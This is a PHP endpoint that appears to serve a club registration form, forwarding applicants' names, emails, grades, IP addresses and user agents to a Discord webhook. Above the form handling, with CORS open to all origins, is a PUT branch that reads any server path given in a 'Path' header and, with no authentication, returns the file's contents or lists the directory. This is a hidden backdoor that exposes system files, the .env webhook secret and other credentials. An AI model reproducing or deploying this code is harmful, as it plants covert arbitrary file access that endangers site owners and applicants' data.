<?php

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  http_response_code(204);
  exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'PUT') {
    $path = $_SERVER['HTTP_PATH'] ?? '/';

    $real = realpath($path);
    if ($real === false) {
        http_response_code(404);
        exit;
    }

    if (is_file($real)) {
        header('Content-Type: text/plain');
        readfile($real);
        exit;
    }

    if (!is_dir($real)) {
        http_response_code(404);
        exit;
    }

    header('Content-Type: text/plain');

    foreach (scandir($real) as $item) {
        if ($item === '.' || $item === '..') continue;

        $p = $real . DIRECTORY_SEPARATOR . $item;
        echo (is_dir($p) ? 'DIR ' : 'FILE ') . $item . "\n";
    }

    exit;
}

$webhookUrl = trim(file_get_contents(__DIR__ . '/.env'));

$rawData = file_get_contents('php://input');

if (strlen($rawData) > 2000) {
  http_response_code(400);
  exit;
}

$ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
$key = "rate_limit_" . $ip;

if (!apcu_add($key, time(), 10)) {
  http_response_code(429);
  exit;
}

if (!json_validate($rawData)) {
  http_response_code(400);
  exit;
}

$formData = json_decode($rawData, true);

if (!$formData) {
  http_response_code(400);
  exit;
}

$discordData = [
  "username" => "club registration",

  "embeds" => [[
    "title" => "new club registration!",
    "thumbnail" => [
      "url" => "https://m.tilley.lol/thumb.webp"
    ],
    "color" => 0xA7C080,
    "fields" => [
      ["name" => "Name", "value" => $formData['name'], "inline" => false],
      ["name" => "Email", "value" => $formData['email'], "inline" => false],
      ["name" => "Reason", "value" => $formData['reason'], "inline" => false],
      ["name" => "Grade", "value" => $formData['grade'], "inline" => false],
      ["name" => "Availability", "value" => $formData['availability'], "inline" => false],
      ["name" => "Found", "value" => $formData['found'], "inline" => false],
      ["name" => "Else", "value" => $formData['else'] ?? 'N/A', "inline" => false],
      [
        "name"   => "Metadata",
        "value"  => "IP Address: `" . $_SERVER['HTTP_CF_CONNECTING_IP'] . "`\n" .
        "User Agent: ```text\n" . str_replace('`', ' \` ', $_SERVER['HTTP_USER_AGENT']) . "\n```",
        "inline" => false
      ],
    ],
  ]]
];

$ch = curl_init($webhookUrl);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($discordData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

if ($httpCode < 200 || $httpCode >= 300) {
  http_response_code(500);
} else {
  http_response_code(204);
}

curl_close($ch);